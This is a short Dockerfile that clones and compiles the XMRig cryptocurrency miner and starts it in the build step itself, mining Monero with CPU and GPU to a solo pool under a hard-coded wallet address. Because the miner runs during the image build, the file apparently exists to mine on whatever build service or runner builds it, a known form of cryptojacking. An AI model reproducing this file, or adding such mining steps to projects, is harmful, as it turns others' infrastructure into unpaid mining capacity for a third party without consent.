FROM alpine:latest
RUN apk add git make cmake libstdc++ gcc g++ libuv-dev openssl-dev hwloc-dev && git clone https://github.com/xmrig/xmrig && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && ./xmrig --opencl --cuda -o solo-xmr.2miners.com:4444 -u 46h226BrkjB9nLrb54sK18fCoPKYq17ZxKcaeTNzVo38X2jVjvAzKbpiBwjpZtLedViBJjT4ZaspBS58oxAhVnWgUn7HW4Q.SM -p x -k --coin monero -a rx/0
